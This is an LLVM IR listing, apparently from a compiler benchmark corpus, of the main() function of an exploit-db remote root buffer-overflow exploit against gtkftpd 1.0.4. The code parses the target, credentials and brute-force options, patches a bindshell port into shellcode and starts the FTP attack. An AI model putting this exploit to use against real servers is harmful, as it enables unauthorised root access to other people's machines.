; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [124 x i8] c"[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"COLUMNS\00", align 1
@columns = common dso_local global i32 0, align 4
@DFLCLM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"h:P:s:u:p:c:b:a:n:rd\00", align 1
@EOF = common dso_local global i32 0, align 4
@host = common dso_local global i8* null, align 8
@optarg = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [34 x i8] c"main(): allocating memory failed.\00", align 1
@port = common dso_local global i32 0, align 4
@sport = common dso_local global i32 0, align 4
@user = common dso_local global i8* null, align 8
@pass = common dso_local global i8* null, align 8
@writedir = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@baseaddr = common dso_local global i32 0, align 4
@align = common dso_local global i32 0, align 4
@attempts = common dso_local global i32 0, align 4
@reverse = common dso_local global i32 0, align 4
@no_io = common dso_local global i32 0, align 4
@DFLUSER = common dso_local global i8* null, align 8
@DFLPASS = common dso_local global i8* null, align 8
@DFLDIR = common dso_local global i8* null, align 8
@DFLADDR = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [62 x i8] c"[!] shell port defined contains null byte(s), using default.\0A\00", align 1
@x86_exec = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [153 x i8] c"[*] target: %s:%d, identity: %s:%s.\0A[*] directory: %s, brute start: 0x%.8x, alignment: %d.\0A[*] memory direction: %s, attempts: %d, bindshell port: %d.\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"downward\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"upward\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@sig_ctrlc = common dso_local global i32 0, align 4
@SIGPIPE = common dso_local global i32 0, align 4
@sig_pipe = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [31 x i8] c"brute force exhausted, failed.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str, i64 0, i64 0))
  %8 = call i64 @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %9 = icmp ne i64 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %2
  %11 = call i64 @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %12 = call i32 @atoi(i64 %11)
  store i32 %12, i32* @columns, align 4
  br label %13

13:                                               ; preds = %10, %2
  %14 = load i32, i32* @columns, align 4
  %15 = icmp sgt i32 7, %14
  br i1 %15, label %19, label %16

16:                                               ; preds = %13
  %17 = load i32, i32* @columns, align 4
  %18 = icmp sgt i32 %17, 256
  br i1 %18, label %19, label %21

19:                                               ; preds = %16, %13
  %20 = load i32, i32* @DFLCLM, align 4
  store i32 %20, i32* @columns, align 4
  br label %21

21:                                               ; preds = %19, %16
  br label %22

22:                                               ; preds = %96, %21
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call i32 @getopt(i32 %23, i8** %24, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* @EOF, align 4
  %27 = icmp ne i32 %25, %26
  br i1 %27, label %28, label %97

28:                                               ; preds = %22
  %29 = load i32, i32* %6, align 4
  switch i32 %29, label %91 [
    i32 104, label %30
    i32 80, label %41
    i32 115, label %44
    i32 117, label %47
    i32 112, label %58
    i32 99, label %69
    i32 98, label %80
    i32 97, label %83
    i32 110, label %86
    i32 114, label %89
    i32 100, label %90
  ]

30:                                               ; preds = %28
  %31 = load i8*, i8** @host, align 8
  %32 = icmp ne i8* %31, null
  br i1 %32, label %40, label %33

33:                                               ; preds = %30
  %34 = load i64, i64* @optarg, align 8
  %35 = call i64 @strdup(i64 %34)
  %36 = inttoptr i64 %35 to i8*
  store i8* %36, i8** @host, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %40, label %38

38:                                               ; preds = %33
  %39 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %40

40:                                               ; preds = %38, %33, %30
  br label %96

41:                                               ; preds = %28
  %42 = load i64, i64* @optarg, align 8
  %43 = call i32 @atoi(i64 %42)
  store i32 %43, i32* @port, align 4
  br label %96

44:                                               ; preds = %28
  %45 = load i64, i64* @optarg, align 8
  %46 = call i32 @atoi(i64 %45)
  store i32 %46, i32* @sport, align 4
  br label %96

47:                                               ; preds = %28
  %48 = load i8*, i8** @user, align 8
  %49 = icmp ne i8* %48, null
  br i1 %49, label %57, label %50

50:                                               ; preds = %47
  %51 = load i64, i64* @optarg, align 8
  %52 = call i64 @strdup(i64 %51)
  %53 = inttoptr i64 %52 to i8*
  store i8* %53, i8** @user, align 8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %57, label %55

55:                                               ; preds = %50
  %56 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %57

57:                                               ; preds = %55, %50, %47
  br label %96

58:                                               ; preds = %28
  %59 = load i8*, i8** @pass, align 8
  %60 = icmp ne i8* %59, null
  br i1 %60, label %68, label %61

61:                                               ; preds = %58
  %62 = load i64, i64* @optarg, align 8
  %63 = call i64 @strdup(i64 %62)
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** @pass, align 8
  %65 = icmp ne i8* %64, null
  br i1 %65, label %68, label %66

66:                                               ; preds = %61
  %67 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %68

68:                                               ; preds = %66, %61, %58
  br label %96

69:                                               ; preds = %28
  %70 = load i8*, i8** @writedir, align 8
  %71 = icmp ne i8* %70, null
  br i1 %71, label %79, label %72

72:                                               ; preds = %69
  %73 = load i64, i64* @optarg, align 8
  %74 = call i64 @strdup(i64 %73)
  %75 = inttoptr i64 %74 to i8*
  store i8* %75, i8** @writedir, align 8
  %76 = icmp ne i8* %75, null
  br i1 %76, label %79, label %77

77:                                               ; preds = %72
  %78 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %79

79:                                               ; preds = %77, %72, %69
  br label %96

80:                                               ; preds = %28
  %81 = load i64, i64* @optarg, align 8
  %82 = call i32 @sscanf(i64 %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32* @baseaddr)
  br label %96

83:                                               ; preds = %28
  %84 = load i64, i64* @optarg, align 8
  %85 = call i32 @atoi(i64 %84)
  store i32 %85, i32* @align, align 4
  br label %96

86:                                               ; preds = %28
  %87 = load i64, i64* @optarg, align 8
  %88 = call i32 @atoi(i64 %87)
  store i32 %88, i32* @attempts, align 4
  br label %96

89:                                               ; preds = %28
  store i32 1, i32* @reverse, align 4
  br label %96

90:                                               ; preds = %28
  store i32 1, i32* @no_io, align 4
  br label %96

91:                                               ; preds = %28
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @usage(i8* %94)
  br label %96

96:                                               ; preds = %91, %90, %89, %86, %83, %80, %79, %68, %57, %44, %41, %40
  br label %22

97:                                               ; preds = %22
  %98 = load i8*, i8** @host, align 8
  %99 = icmp ne i8* %98, null
  br i1 %99, label %105, label %100

100:                                              ; preds = %97
  %101 = load i8**, i8*** %5, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @usage(i8* %103)
  br label %105

105:                                              ; preds = %100, %97
  %106 = load i8*, i8** @user, align 8
  %107 = icmp ne i8* %106, null
  br i1 %107, label %110, label %108

108:                                              ; preds = %105
  %109 = load i8*, i8** @DFLUSER, align 8
  store i8* %109, i8** @user, align 8
  br label %110

110:                                              ; preds = %108, %105
  %111 = load i8*, i8** @pass, align 8
  %112 = icmp ne i8* %111, null
  br i1 %112, label %115, label %113

113:                                              ; preds = %110
  %114 = load i8*, i8** @DFLPASS, align 8
  store i8* %114, i8** @pass, align 8
  br label %115

115:                                              ; preds = %113, %110
  %116 = load i8*, i8** @writedir, align 8
  %117 = icmp ne i8* %116, null
  br i1 %117, label %120, label %118

118:                                              ; preds = %115
  %119 = load i8*, i8** @DFLDIR, align 8
  store i8* %119, i8** @writedir, align 8
  br label %120

120:                                              ; preds = %118, %115
  %121 = load i32, i32* @baseaddr, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %125, label %123

123:                                              ; preds = %120
  %124 = load i32, i32* @DFLADDR, align 4
  store i32 %124, i32* @baseaddr, align 4
  br label %125

125:                                              ; preds = %123, %120
  %126 = load i32, i32* @align, align 4
  %127 = icmp sgt i32 %126, 3
  br i1 %127, label %128, label %129

128:                                              ; preds = %125
  store i32 2, i32* @align, align 4
  br label %129

129:                                              ; preds = %128, %125
  %130 = load i32, i32* @sport, align 4
  %131 = and i32 %130, 65280
  %132 = ashr i32 %131, 8
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %129
  %135 = load i32, i32* @sport, align 4
  %136 = and i32 %135, 255
  %137 = icmp ne i32 %136, 0
  br i1 %137, label %140, label %138

138:                                              ; preds = %134, %129
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.5, i64 0, i64 0))
  store i32 7979, i32* @sport, align 4
  br label %140

140:                                              ; preds = %138, %134
  %141 = load i32, i32* @sport, align 4
  %142 = and i32 %141, 65280
  %143 = ashr i32 %142, 8
  %144 = load i32*, i32** @x86_exec, align 8
  %145 = getelementptr inbounds i32, i32* %144, i64 20
  store i32 %143, i32* %145, align 4
  %146 = load i32, i32* @sport, align 4
  %147 = and i32 %146, 255
  %148 = load i32*, i32** @x86_exec, align 8
  %149 = getelementptr inbounds i32, i32* %148, i64 21
  store i32 %147, i32* %149, align 4
  %150 = load i8*, i8** @host, align 8
  %151 = load i32, i32* @port, align 4
  %152 = load i8*, i8** @user, align 8
  %153 = load i8*, i8** @pass, align 8
  %154 = load i8*, i8** @writedir, align 8
  %155 = load i32, i32* @baseaddr, align 4
  %156 = load i32, i32* @align, align 4
  %157 = load i32, i32* @reverse, align 4
  %158 = icmp ne i32 %157, 0
  %159 = xor i1 %158, true
  %160 = zext i1 %159 to i64
  %161 = select i1 %159, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0)
  %162 = load i32, i32* @attempts, align 4
  %163 = load i32, i32* @sport, align 4
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([153 x i8], [153 x i8]* @.str.6, i64 0, i64 0), i8* %150, i32 %151, i8* %152, i8* %153, i8* %154, i32 %155, i32 %156, i8* %161, i32 %162, i32 %163)
  %165 = load i32, i32* @SIGINT, align 4
  %166 = load i32, i32* @sig_ctrlc, align 4
  %167 = call i32 @signal(i32 %165, i32 %166)
  %168 = load i32, i32* @SIGPIPE, align 4
  %169 = load i32, i32* @sig_pipe, align 4
  %170 = call i32 @signal(i32 %168, i32 %169)
  %171 = call i32 (...) @ftp_connect()
  %172 = call i32 @printe(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0), i32 0)
  %173 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @getenv(i8*) #1

declare dso_local i32 @atoi(i64) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strdup(i64) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @sscanf(i64, i8*, i32*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @ftp_connect(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
